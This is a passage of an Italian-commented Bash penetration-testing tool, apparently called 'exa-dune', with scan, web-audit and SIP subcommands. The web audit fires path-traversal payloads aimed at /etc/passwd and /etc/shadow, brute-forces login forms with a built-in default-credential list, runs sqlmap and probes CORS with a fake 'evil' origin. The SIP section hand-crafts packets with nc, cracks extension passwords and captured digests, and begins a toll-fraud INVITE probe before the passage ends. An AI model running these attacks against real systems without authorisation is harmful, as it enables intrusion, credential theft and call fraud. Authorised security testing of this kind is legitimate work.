                 -oJ '$OUTDIR/masscan.json' 2>&1 | tee '$OUTDIR/masscan.log' || true"
            # Estrai porte trovate da masscan per passarle a nmap
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/masscan.json" ]]; then
                local _mscan_ports
                _mscan_ports=$(EXA_MASSCAN_OUT="$OUTDIR/masscan.json" python3 -c "
import json,os,sys
try:
    data=json.load(open(os.environ['EXA_MASSCAN_OUT']))
    ports=sorted(set(str(h['ports'][0]['port']) for h in data if h.get('ports')))
    print(','.join(ports))
except Exception as e:
    print('[WARN] masscan JSON parse error: '+str(e), file=sys.stderr)
" 2>/dev/null || \
                    grep -oP '"port"\s*:\s*\K[0-9]+' "$OUTDIR/masscan.json" 2>/dev/null | \
                    sort -un | tr '\n' ',' | sed 's/,$//' || true)
                if [[ -n "$_mscan_ports" ]]; then
                    log "  Masscan trovato porte: $_mscan_ports"
                    found INFO "SCAN — masscan: porte aperte → $_mscan_ports"
                    # Usa porte masscan come input per nmap -sV
                    run_cmd "nmap_masscan_ports" \
                        "nmap -sV -sC -p '$_mscan_ports' $NMAP_TIMING \
                         -oA '$OUTDIR/nmap_masscan' $target 2>&1 | tee '$OUTDIR/nmap_masscan.log'"
                fi
            fi
        else
            warn "masscan non trovato — pre-scan rapido saltato (installa: apt install masscan)"
        fi
    fi

    section "ARP Scan"
    if require_tool arp-scan; then
        local iface; iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{print $5; exit}' || echo eth0)
        run_cmd "arp_scan" \
            "arp-scan -I ${iface} ${target}/32 2>/dev/null | tee \"$OUTDIR\"/arp.txt; echo '[DONE] arp-scan'"
    fi

    section "Nmap Fast (top 1000 + scripts)"
    run_cmd "nmap_fast" \
        "nmap -sV -sC -O --min-rate $NMAP_RATE_FAST $NMAP_TIMING \
         -oA \"$OUTDIR\"/nmap_fast $target 2>&1 | tee \"$OUTDIR\"/nmap_fast.log"
    # Rate limiting adattivo: analizza il log appena prodotto
    [[ "${ADAPTIVE:-0}" -eq 1 ]] && _adaptive_rate_check "$OUTDIR/nmap_fast.log"

    if [[ $do_full -eq 1 ]]; then
        section "Nmap Full (-p-)"
        run_cmd "nmap_full" \
            "nmap -sV -p- --min-rate $NMAP_RATE_FULL $NMAP_TIMING \
             -oA \"$OUTDIR\"/nmap_full $target 2>&1 | tee \"$OUTDIR\"/nmap_full.log"
        [[ "${ADAPTIVE:-0}" -eq 1 ]] && _adaptive_rate_check "$OUTDIR/nmap_full.log"
    fi

    section "Nmap UDP top $udp_top"
    run_cmd "nmap_udp" \
        "nmap -sU --top-ports $udp_top $NMAP_TIMING \
         -oA \"$OUTDIR\"/nmap_udp $target 2>&1 | tee \"$OUTDIR\"/nmap_udp.log"
    [[ "${ADAPTIVE:-0}" -eq 1 ]] && _adaptive_rate_check "$OUTDIR/nmap_udp.log"

    section "Searchsploit (da nmap XML)"
    if require_tool searchsploit && [[ $DRY_RUN -eq 0 ]]; then
        local tries=0
        while [[ ! -f "$OUTDIR/nmap_fast.xml" && $tries -lt 60 ]]; do
            sleep 5; ((tries++))
        done
        [[ -f "$OUTDIR/nmap_fast.xml" ]] && \
            searchsploit --nmap "$OUTDIR/nmap_fast.xml" 2>/dev/null | tee "$OUTDIR/searchsploit.txt"
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} searchsploit --nmap $OUTDIR/nmap_fast.xml"
    fi

    if [[ $do_vuln -eq 1 ]]; then
        section "Nmap Vuln Scripts"
        run_cmd "nmap_vuln" \
            "nmap -sV --script vuln $NMAP_TIMING \
             -oN \"$OUTDIR\"/nmap_vuln.txt $target 2>&1 | tee \"$OUTDIR\"/nmap_vuln.log"
        # Auto-searchsploit per ogni banner trovato
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_fast.xml" ]]; then
            log "Searchsploit per banner individuali..."
            grep -oP 'product="[^"]+"' "$OUTDIR/nmap_fast.xml" 2>/dev/null | \
                sed 's/product="//;s/"//' | sort -u | while IFS= read -r prod; do
                [[ -z "$prod" ]] && continue
                echo "--- $prod ---" >> "$OUTDIR/searchsploit_banners.txt"
                searchsploit "$prod" 2>/dev/null | head -10 >> "$OUTDIR/searchsploit_banners.txt" || true
            done
        fi
    fi

    ok "Scan completato → $OUTDIR"
    echo "  Risultati: $OUTDIR/"

    # Auto-suggest attacchi basati sulle porte trovate
    if [[ $DRY_RUN -eq 0 ]]; then
        local nmap_out
        nmap_out=$(find "$OUTDIR" -name "nmap_fast.nmap" -o -name "nmap_fast.gnmap" 2>/dev/null | head -1)
        if [[ -n "$nmap_out" ]]; then
            _print_suggestions "$nmap_out" "$target"
            echo -e "  ${BOLD}Suggerimento:${NC} exa-dune pipeline $target --from-scan $OUTDIR_BASE"
            echo -e "  (pipeline esegue automaticamente gli attacchi e genera report PDF)"
        fi
    fi
}

# ============================================================
#  SUBCOMMAND: web
# ============================================================
usage_web() {
    echo "Uso: exa-dune web <TARGET> [OPTIONS]"
    echo ""
    echo "  Web application audit"
    echo "  Wraps: curl (headers/SSL), nikto, gobuster, nmap http NSE"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (default: 443)"
    echo "  --scheme SCHEME    http o https (default: https)"
    echo "  --wordlist FILE    Wordlist per gobuster"
    echo "  --threads N        Thread gobuster (default: 20)"
    echo "  --fuzz             Fuzzing parametri GET (ffuf/wfuzz)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_web() {
    local target="" port=443 scheme="https" threads=20 do_fuzz=0
    local wordlist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
            --wordlist)  _req_arg "$1" "${2:-}"; wordlist="$2";    shift 2 ;;
            --threads)   _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
            --fuzz)      do_fuzz=1;        shift ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_web; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_web; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_web; exit 1; }
    validate_target "$target"
    validate_port "$port"
    [[ "$scheme" != "http" && "$scheme" != "https" ]] && { err "Scheme non valido: $scheme (http|https)"; exit 1; }
    setup_outdir "$target" "web_${port}"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"

    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
    local base_url="${scheme}://${target}:${port}"
    local wl; wl="${wordlist:-$(_wl_web)}"

    section "HTTP Headers + Redirect"
    run_cmd "headers" \
        "curl -sv $insecure -L --max-time ${CURL_TIMEOUT:-10} -o /dev/null '${base_url}/' 2>&1 \
         | tee \"$OUTDIR\"/headers.txt"
    run_cmd "sec_headers" \
        "curl -sI $insecure --max-time ${CURL_TIMEOUT:-10} '${base_url}/' 2>&1 \
         | grep -iE 'strict-transport|x-frame|x-xss|x-content-type|content-security|permissions-policy|referrer' \
         | tee \"$OUTDIR\"/security_headers.txt"

    if [[ "$scheme" == "https" ]]; then
        section "SSL/TLS Analysis"
        run_cmd "ssl_nmap" \
            "nmap -p $port \
             --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
             -oN \"$OUTDIR\"/ssl_nmap.txt $target 2>&1"
        run_cmd "ssl_cert" \
            "echo | openssl s_client -connect '${target}:${port}' 2>/dev/null \
             | openssl x509 -text -noout 2>/dev/null | tee \"$OUTDIR\"/cert.txt"
        # testssl.sh — analisi TLS completa
        if command -v testssl.sh &>/dev/null || command -v testssl &>/dev/null; then
            local _tssl_bin="testssl.sh"; command -v testssl.sh &>/dev/null || _tssl_bin="testssl"
            run_cmd "testssl" \
                "$_tssl_bin --color 0 --jsonfile '$OUTDIR/testssl.json' \
                 --logfile '$OUTDIR/testssl.log' '${target}:${port}' 2>&1 | tail -20"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/testssl.log" ]]; then
                grep -iE "CRITICAL|HIGH|MEDIUM|VULNERABLE|NOT ok" "$OUTDIR/testssl.log" 2>/dev/null | \
                    while IFS= read -r _tline; do
                        found MEDIUM "TLS — $_tline"
                    done || true
            fi
        fi
    fi

    section "Web Vulnerability Scanner"
    if tool_ok nuclei; then
        # nuclei: veloce, template-based, modern (preferito a nikto)
        local nuclei_target="${scheme}://${target}:${port}"
        # -duc: no update check  -nh: no banner  -no-verify: ignora SSL self-signed
        local nuclei_opts="-u $nuclei_target -severity low,medium,high,critical -duc -nh -no-verify -o $OUTDIR/nuclei.txt"
        run_cmd "nuclei" "nuclei $nuclei_opts 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nuclei.txt" && -s "$OUTDIR/nuclei.txt" ]]; then
            grep -iE "\[critical\]|\[high\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                while IFS= read -r line; do found HIGH "Nuclei — $line"; done || true
            grep -iE "\[medium\]|\[low\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                while IFS= read -r line; do found MEDIUM "Nuclei — $line"; done || true
            local nc; nc=$(wc -l < "$OUTDIR/nuclei.txt" 2>/dev/null || echo 0)
            log "  Nuclei: $nc finding(s) → $OUTDIR/nuclei.txt"
        fi
    elif require_tool nikto; then
        local nikto_opts="-h $target -p $port"
        [[ "$scheme" == "https" ]] && nikto_opts="$nikto_opts -ssl"
        run_cmd "nikto" "nikto $nikto_opts -output $OUTDIR/nikto.txt 2>&1"
    fi

    section "WAF Detection (wafw00f)"
    if command -v wafw00f &>/dev/null; then
        run_cmd "wafw00f" \
            "wafw00f '${base_url}' -o '$OUTDIR/wafw00f.txt' 2>&1 | tee '$OUTDIR/wafw00f_stdout.txt' || true"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/wafw00f_stdout.txt" ]]; then
            if grep -qiE "is behind|WAF" "$OUTDIR/wafw00f_stdout.txt" 2>/dev/null; then
                local waf_name; waf_name=$(grep -oiE "behind [^\n]+" "$OUTDIR/wafw00f_stdout.txt" | head -1 || true)
                found INFO "WEB — WAF rilevato: $waf_name"
            else
                log "  wafw00f: nessun WAF rilevato"
            fi
        fi
    else
        warn "wafw00f non trovato — installa: pip3 install wafw00f"
    fi

    section "Gobuster Directory Enum + ffuf"
    if require_tool gobuster && [[ -n "$wl" ]]; then
        local gb_opts="dir -u $base_url -w $wl -t $threads -q"
        [[ "$scheme" == "https" ]] && gb_opts="$gb_opts -k"
        run_cmd "gobuster" "gobuster $gb_opts 2>&1 | tee \"$OUTDIR\"/gobuster.txt"
    elif tool_ok ffuf && [[ -n "$wl" ]]; then
        run_cmd "ffuf_dir" \
            "ffuf -u '${base_url}/FUZZ' -w '$wl' \
             $([[ "$scheme" == "https" ]] && echo '-k') \
             -mc 200,204,301,302,307,401,403 -t $threads \
             -o '$OUTDIR/ffuf_dir.json' -of json 2>&1 | tail -10"
    elif [[ -z "$wl" ]]; then
        warn "Wordlist web non trovata — gobuster/ffuf saltati"
    fi

    section "Nmap HTTP NSE Scripts"
    run_cmd "nmap_http" \
        "nmap -p $port \
         --script http-methods,http-auth-finder,http-stored-xss,http-dombased-xss,http-csrf,http-robots.txt \
         -oN \"$OUTDIR\"/nmap_http.txt $target 2>&1"

    section "JS File Analysis (endpoint extraction)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local js_files
        js_files=$(curl -sk $insecure --max-time ${CURL_TIMEOUT:-10} "${base_url}/" 2>/dev/null \
                   | grep -oP 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' || true)
        local js_count=0
        while IFS= read -r jsfile; do
            [[ -z "$jsfile" ]] && continue
            local js_url="${base_url}/${jsfile#/}"
            local jsname; jsname=$(basename "$jsfile" | tr '/?&' '_')
            curl -sk $insecure --max-time ${CURL_TIMEOUT:-10} "$js_url" -o "$OUTDIR/js_${jsname}" 2>/dev/null && {
                grep -oP '(?:api|page|action|endpoint)["\s:=]+["'"'"'][^"'"'"'<>\s]{3,80}["'"'"']' \
                    "$OUTDIR/js_${jsname}" 2>/dev/null \
                    | sort -u >> "$OUTDIR/js_endpoints.txt" || true
                ((js_count++))
            }
        done <<< "$js_files"
        [[ $js_count -gt 0 ]] && log "Analizzati $js_count file JS"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} JS analysis su ${base_url}/"
    fi

    section "HTTP Methods Pericolosi"
    if [[ $DRY_RUN -eq 0 ]]; then
        for method in PUT DELETE TRACE CONNECT OPTIONS; do
            local code
            code=$(curl -sk $insecure -X "$method" --max-time 5 \
                   -o /dev/null -w "%{http_code}" "${base_url}/" 2>/dev/null)
            echo "  $method → HTTP $code" | tee -a "$OUTDIR/http_methods.txt"
            [[ "$method" == "PUT" && "$code" != "405" && "$code" != "501" ]] && \
                found MEDIUM "HTTP $method abilitato su $base_url → $code"
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Test metodi HTTP: PUT DELETE TRACE CONNECT OPTIONS"
    fi

    if [[ $do_fuzz -eq 1 ]]; then
        section "Parameter Fuzzing (ffuf/wfuzz)"
        local fuzz_wl; fuzz_wl=$(_wl_lfi)
        if tool_ok ffuf && [[ -f "$fuzz_wl" ]]; then
            run_cmd "ffuf_lfi" \
                "ffuf -u '${base_url}/FUZZ' -w $fuzz_wl -mc 200,301,302,403 \
                 $([[ "$scheme" == "https" ]] && echo '-k') \
                 -t $threads -o \"$OUTDIR\"/ffuf_lfi.json -of json 2>&1 | tail -5"
            run_cmd "ffuf_params" \
                "ffuf -u '${base_url}/?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
                 -mc 200,301,302 $([[ "$scheme" == "https" ]] && echo '-k') \
                 -t $threads -o \"$OUTDIR\"/ffuf_params.json -of json 2>&1 | tail -5"
        elif tool_ok wfuzz && [[ -f "$fuzz_wl" ]]; then
            run_cmd "wfuzz_lfi" \
                "wfuzz -c -w $fuzz_wl --hc 404,400 \
                 $([[ "$scheme" == "https" ]] && echo '--ssl') \
                 '$base_url/FUZZ' 2>&1 | tee \"$OUTDIR\"/wfuzz_lfi.txt | tail -10"
        else
            warn "ffuf e wfuzz non trovati — fuzzing saltato"
        fi
    fi

    section "LFI / Path Traversal (percorsi sensibili embedded)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local lfi_payloads=(
            "../../etc/passwd" "../../../etc/passwd" "../../../../etc/passwd"
            "../../etc/shadow" "../../etc/passwd%00"
            "..%2F..%2Fetc%2Fpasswd" "%2e%2e%2fetc%2fpasswd"
            "../../proc/version" "../../proc/net/route"
            "../../tmp/passwd" "../../var/etc/passwd"
        )
        for param in "file" "path" "page" "lang" "template" "include" "url" "load" "document"; do
            for payload in "${lfi_payloads[@]}"; do
                local code body
                body=$(curl -sk $insecure --max-time 5 \
                    "${base_url}/?${param}=${payload}" 2>/dev/null | head -3 || true)
                if echo "$body" | grep -qE "root:|bin:|daemon:|nobody:"; then
                    found CRITICAL "WEB LFI — ${base_url}/?${param}=${payload} → /etc/passwd esposto"
                    echo "${param}=${payload}" >> "$OUTDIR/lfi_found.txt"
                    break
                fi
            done
        done
        # Path traversal su percorsi CGI comuni
        for cgi_path in "/cgi-bin/readfile.cgi" "/cgi-bin/download.cgi" \
                        "/download" "/getfile" "/readfile"; do
            for payload in "../../etc/passwd" "../etc/passwd"; do
                body=$(curl -sk $insecure --max-time 5 \
                    "${base_url}${cgi_path}?file=${payload}" 2>/dev/null | head -3 || true)
                if echo "$body" | grep -qE "root:|bin:|daemon:"; then
                    found CRITICAL "WEB LFI — ${base_url}${cgi_path}?file=${payload} → /etc/passwd esposto"
                fi
            done
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} LFI/path traversal probe su ${base_url}"
    fi

    section "CORS Misconfiguration + Clickjacking"
    if [[ $DRY_RUN -eq 0 ]]; then
        # CORS: invia Origin arbitrario, verifica Access-Control-Allow-Origin
        local cors_resp
        cors_resp=$(curl -sk $insecure --max-time 8 \
            -H "Origin: https://evil.exa-dune-test.local" \
            -I "${base_url}/" 2>/dev/null || true)
        local acao; acao=$(echo "$cors_resp" | grep -i "access-control-allow-origin:" | head -1 || true)
        if echo "$acao" | grep -qiE "evil\.exa-dune-test|^\*"; then
            [[ "$acao" == *"*"* ]] && found HIGH "WEB CORS — Access-Control-Allow-Origin: * (wildcard)"
            echo "$acao" | grep -qi "evil" && \
                found CRITICAL "WEB CORS — Origin arbitrario riflesso: ${acao}"
        fi
        # Clickjacking: assenza di X-Frame-Options o CSP frame-ancestors
        local xfo; xfo=$(echo "$cors_resp" | grep -i "x-frame-options:" | head -1 || true)
        local csp; csp=$(echo "$cors_resp" | grep -i "content-security-policy:" | grep -i "frame-ancestors" | head -1 || true)
        if [[ -z "$xfo" && -z "$csp" ]]; then
            found MEDIUM "WEB — Clickjacking: X-Frame-Options assente e nessun CSP frame-ancestors"
        fi
        echo "CORS: ${acao:-non presente}" >> "$OUTDIR/web_security.txt"
        echo "X-Frame-Options: ${xfo:-ASSENTE}" >> "$OUTDIR/web_security.txt"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} CORS + clickjacking test su ${base_url}"
    fi

    section "SQL Injection (sqlmap — livello base)"
    if tool_ok sqlmap && [[ $DRY_RUN -eq 0 ]]; then
        # Crawl breve + test parametri GET (non distruttivo: --level 1 --risk 1)
        run_cmd "sqlmap" \
            "sqlmap -u '${base_url}/' --crawl=2 --forms \
             --level 1 --risk 1 --batch --smart \
             $([[ "$scheme" == "https" ]] && echo '--ignore-proxy') \
             --output-dir \"$OUTDIR\"/sqlmap 2>&1 | tail -20"
        if [[ -d "$OUTDIR/sqlmap" ]]; then
            if grep -r "sqlmap identified" "$OUTDIR/sqlmap/" 2>/dev/null | grep -q "injectable"; then
                found CRITICAL "WEB SQLi — parametro iniettabile trovato (vedi $OUTDIR/sqlmap/)"
            fi
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} sqlmap -u '${base_url}/' --crawl=2 --forms --level 1 --risk 1 --batch"
    else
        warn "sqlmap non trovato — SQL injection saltato"
    fi

    section "Form Auth Bypass (credenziali default embedded)"
    if [[ $DRY_RUN -eq 0 ]]; then
        # Cerca form di login nella pagina principale
        local login_action
        login_action=$(curl -sk $insecure --max-time 8 "${base_url}/" 2>/dev/null \
            | grep -ioP '(?<=action=")[^"]+' | grep -iE "login|auth|session|signin" | head -1 || true)
        [[ -z "$login_action" ]] && login_action="/"
        local login_url="${base_url}${login_action}"
        # Credenziali comuni per device embedded
        local default_creds=(
            "admin:admin" "admin:password" "admin:1234" "admin:12345"
            "admin:Admin1234" "admin:" "root:root" "root:admin"
            "root:password" "user:user" "user:password"
            "supervisor:supervisor" "operator:operator"
            "service:service" "support:support"
            "guest:guest" "test:test"
        )
        local field_patterns=(
            "username=UUUU&password=PPPP"
            "user=UUUU&pass=PPPP"
            "login=UUUU&password=PPPP"
            "name=UUUU&password=PPPP"
        )
        for cred in "${default_creds[@]}"; do
            local u="${cred%%:*}" p="${cred##*:}"
            for fpat in "${field_patterns[@]}"; do
                local post_data="${fpat/UUUU/$u}"; post_data="${post_data/PPPP/$p}"
                local code
                code=$(curl -sk $insecure --max-time 6 -X POST \
                    -d "$post_data" -o /dev/null -w "%{http_code}" \
                    -L "${login_url}" 2>/dev/null || true)
                # 200/302 dopo POST con redirect diverso da login → probabile successo
                if [[ "$code" == "302" ]] || [[ "$code" == "200" ]]; then
                    local body_check
                    body_check=$(curl -sk $insecure --max-time 6 -X POST \
                        -d "$post_data" -L "${login_url}" 2>/dev/null | head -5 || true)
                    if echo "$body_check" | grep -qiE "logout|dashboard|welcome|admin|panel|home" && \
                       ! echo "$body_check" | grep -qiE "error|invalid|wrong|failed|incorrect"; then
                        found CRITICAL "WEB AUTH — credenziali default valide: ${u}:${p} (${login_url})"
                        echo "${u}:${p}" >> "$OUTDIR/web_default_creds.txt"
                        break 2
                    fi
                fi
            done
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Form auth bypass + default creds test su ${base_url}"
    fi

    local xss_script="$EXA_SCRIPTS_DIR/js/xss_generator.js"
    if [[ -f "$xss_script" ]] && command -v node &>/dev/null; then
        section "XSS Payload Testing (xss_generator.js)"
        run_cmd "xss_test_js" "node \"$xss_script\" --target ${scheme}://${target}:${port} --mode test 2>&1 | tee \"$OUTDIR\"/xss_test.txt"
    fi

    ok "Web audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: sip
# ============================================================
usage_sip() {
    echo "Uso: exa-dune sip <TARGET> [OPTIONS]"
    echo ""
    echo "  SIP/VoIP enumeration e audit"
    echo "  Wraps: nmap sip NSE, svmap, svwar, svcrack"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta SIP (default: 5060)"
    echo "  --range RANGE      Range extension svwar (default: 100-299)"
    echo "  --wordlist FILE    Wordlist per svcrack"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_sip() {
    local target="" port=5060 ext_range="100-299" wordlist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --range)     _req_arg "$1" "${2:-}"; ext_range="$2";   shift 2 ;;
            --wordlist)  _req_arg "$1" "${2:-}"; wordlist="$2";    shift 2 ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_sip; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_sip; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_sip; exit 1; }
    validate_target "$target"
    validate_port "$port"
    setup_outdir "$target" "sip"
    log "Target: $target:$port | Output: $OUTDIR"

    section "Nmap SIP Scan (TCP+UDP 5060/5061)"
    run_cmd "nmap_sip" \
        "nmap -p $port,5061 -sU -sS \
         --script sip-enum-users,sip-methods \
         -oN \"$OUTDIR\"/nmap_sip.txt $target 2>&1"

    section "SIP Fingerprinting (svmap)"
    local svmap_cmd=""
    if tool_ok svmap; then
        svmap_cmd="svmap $target 2>&1 | tee \"$OUTDIR\"/svmap.txt"
    elif python3 -c "import sipvicious" 2>/dev/null; then
        svmap_cmd="python3 -m sipvicious.svmap $target 2>&1 | tee \"$OUTDIR\"/svmap.txt"
    fi
    if [[ -n "$svmap_cmd" ]]; then
        run_cmd "svmap" "$svmap_cmd"
    else
        warn "svmap non trovato — uso probe OPTIONS manuale"
        if [[ $DRY_RUN -eq 0 ]]; then
            local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
            [[ -z "$attacker_ip" ]] && attacker_ip="127.0.0.1"
            local probe
            probe=$(printf 'OPTIONS sip:ping@%s SIP/2.0\r\nVia: SIP/2.0/UDP %s:5060;branch=z9hG4bKpk1\r\nFrom: <sip:test@%s>;tag=1\r\nTo: <sip:ping@%s>\r\nCall-ID: 1@%s\r\nCSeq: 1 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n' \
                "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip")
            echo "$probe" | nc -u -w 3 "$target" "$port" 2>&1 | head -5 | tee "$OUTDIR/sip_options_probe.txt"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SIP OPTIONS probe → $target:$port"
        fi
    fi

    section "Extension Enumeration svwar ($ext_range)"
    local svwar_cmd=""
    if tool_ok svwar; then
        svwar_cmd="svwar -e${ext_range} $target 2>&1 | tee \"$OUTDIR\"/svwar.txt"
    elif python3 -c "import sipvicious" 2>/dev/null; then
        svwar_cmd="python3 -m sipvicious.svwar -e${ext_range} $target 2>&1 | tee \"$OUTDIR\"/svwar.txt"
    fi
    if [[ -n "$svwar_cmd" ]]; then
        run_cmd "svwar" "$svwar_cmd"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/svwar.txt" ]]; then
            grep -iE "found|exist|200 OK" "$OUTDIR/svwar.txt" 2>/dev/null \
                | tee "$OUTDIR/sip_extensions.txt" || true
        fi
    else
        warn "svwar non trovato — extension enum saltato"
    fi

    section "SIP Password Crack (svcrack)"
    local wl="${wordlist:-$(_wl_pass)}"
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sip_extensions.txt" ]]; then
        local found_exts
        found_exts=$(grep -oP '\d{3,6}' "$OUTDIR/sip_extensions.txt" 2>/dev/null | head -10 || true)
        local svcrack_bin=""
        tool_ok svcrack && svcrack_bin="svcrack"
        python3 -c "import sipvicious" 2>/dev/null && svcrack_bin="python3 -m sipvicious.svcrack"
        if [[ -n "$svcrack_bin" && -n "$found_exts" ]]; then
            for ext in $found_exts; do
                log "  Crack extension: $ext"
                run_cmd "svcrack_$ext" \
                    "$svcrack_bin -u $ext -d $wl $target 2>&1 | tee \"$OUTDIR\"/svcrack_${ext}.txt"
            done
        elif [[ -n "$svcrack_bin" ]]; then
            warn "Nessuna extension trovata — test su utente 'admin' con wordlist"
            run_cmd "svcrack_admin" \
                "$svcrack_bin -u admin -d $wl $target 2>&1 | tee \"$OUTDIR\"/svcrack_admin.txt"
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} svcrack -u <ext> -d $wl $target"
    fi

    section "SIP Method Probes (INVITE, REGISTER, OPTIONS, INFO, SUBSCRIBE)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        [[ -z "$attacker_ip" ]] && attacker_ip="127.0.0.1"
        for method in INVITE REGISTER OPTIONS INFO SUBSCRIBE NOTIFY; do
            local probe; probe=$(printf '%s sip:%s SIP/2.0\r\nVia: SIP/2.0/UDP %s:5060;branch=z9hG4bKpk\r\nFrom: <sip:kit@%s>;tag=1\r\nTo: <sip:%s>\r\nCall-ID: probe@%s\r\nCSeq: 1 %s\r\nMax-Forwards: 10\r\nContent-Length: 0\r\n\r\n' \
                "$method" "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip" "$method")
            local resp; resp=$(echo "$probe" | nc -u -w 2 "$target" "$port" 2>&1 | head -1 || true)
            echo "  $method → $resp" | tee -a "$OUTDIR/sip_methods.txt"
            # SIP digest challenge capture
            if echo "$resp" | grep -q "^SIP/2.0 401\|^SIP/2.0 407"; then
                found INFO "SIP:$port — $method richiede autenticazione digest (${resp})"
                # Cattura il challenge completo per offline crack
                printf '%b' "$probe" | nc -u -w 3 "$target" "$port" 2>/dev/null \
                    >> "$OUTDIR/sip_digest_challenges.txt" || true
            fi
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Probe SIP: INVITE REGISTER OPTIONS INFO SUBSCRIBE → $target:$port"
    fi

    section "SIP over TCP test"
    if [[ $DRY_RUN -eq 0 ]]; then
        check_port "$target" "$port" && {
            local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
            [[ -z "$attacker_ip" ]] && attacker_ip="127.0.0.1"
            local tcp_probe; tcp_probe=$(printf 'OPTIONS sip:%s SIP/2.0\r\nVia: SIP/2.0/TCP %s:5060;branch=z9hG4bKtcp\r\nFrom: <sip:test@%s>;tag=1\r\nTo: <sip:%s>\r\nCall-ID: tcp@%s\r\nCSeq: 1 OPTIONS\r\nMax-Forwards: 10\r\nContent-Length: 0\r\n\r\n' \
                "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip")
            local tcp_resp
            tcp_resp=$(printf '%b' "$tcp_probe" | nc -w 3 "$target" "$port" 2>/dev/null | head -1 || true)
            echo "SIP/TCP:$port → $tcp_resp" >> "$OUTDIR/sip_methods.txt"
            echo "$tcp_resp" | grep -qi "SIP/2.0" && \
                found INFO "SIP:$port — risponde anche su TCP (non solo UDP)"
        } || true
    fi

    section "SIP Digest Crack (sipcrack/sipdump)"
    if [[ -s "$OUTDIR/sip_digest_challenges.txt" && $DRY_RUN -eq 0 ]]; then
        local wl="${wordlist:-$(_wl_pass)}"
        if tool_ok sipcrack; then
            run_cmd "sipcrack" \
                "sipcrack -w $wl \"$OUTDIR\"/sip_digest_challenges.txt 2>&1 \
                 | tee \"$OUTDIR\"/sipcrack_results.txt"
            grep -i "password\|cracked" "$OUTDIR/sipcrack_results.txt" 2>/dev/null | \
                while IFS= read -r line; do found HIGH "SIP DIGEST CRACKED — $line"; done || true
        else
            warn "sipcrack non trovato — digest offline crack saltato"
        fi
    fi

    section "SIP Toll Fraud Probe (INVITE verso PSTN esterno)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        [[ -z "$attacker_ip" ]] && attacker_ip="127.0.0.1"
        # Prova INVITE verso numero esterno (non reale — solo test se il gateway accetta)
        local toll_dest="sip:00390000000@${target}"
        local toll_invite
        toll_invite="INVITE ${toll_dest} SIP/2.0\r\n"
        toll_invite+="Via: SIP/2.0/UDP ${attacker_ip}:5060;branch=z9hG4bKtf1\r\n"
        toll_invite+="Max-Forwards: 70\r\n"
        toll_invite+="From: <sip:100@${attacker_ip}>;tag=tf1\r\n"
        toll_invite+="To: <${toll_dest}>\r\n"
        toll_invite+="Call-ID: tf1@${attacker_ip}\r\n"
        toll_invite+="CSeq: 1 INVITE\r\n"
        toll_invite+="Content-Length: 0\r\n\r\n"
        local tf_resp
